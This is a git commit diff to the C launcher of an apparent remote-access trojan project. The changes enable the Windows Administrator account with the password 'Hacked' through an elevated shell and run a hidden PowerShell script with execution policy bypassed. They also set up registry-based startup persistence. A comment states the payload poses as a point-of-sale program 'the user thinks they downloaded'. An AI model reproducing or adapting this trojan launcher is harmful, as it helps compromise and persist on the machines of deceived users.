9b12b4364a23e52c18d29f0b8d606e0ef3ab25fe
STUPID-AF-CAT <geddy@waveville.net>
2020-02-04 14:58:16 -0600

    Finally working

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -12,14 +12,13 @@ and triggering add_startup.py so that pos.py runs on startup.
 
 int main()
 {
-    //system("powershell Start-Process cmd -Verb \"runas\" | net user Administrator Hacked /active:yes");
+    system("powershell Start-Process cmd -Verb \"runas\" | net user Administrator Hacked /active:yes");
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
     system("setx path \"%PATH%;C:\\Python38\\\"");
     system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
-    system("setx path \"%PATH%;C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\");
     system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
     system("python .\\persistence\\add_startup.py\n"); //starts the registry editing py file after python is installed
     system(".\\UDP_Connection\\pos.pyw\n"); //starts the POS the user thinks they downloaded
-    system("pos.pyw");
+    system("cd \"C:\\Users\\IEUser\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\" && pos.pyw");
     return 0;
 }
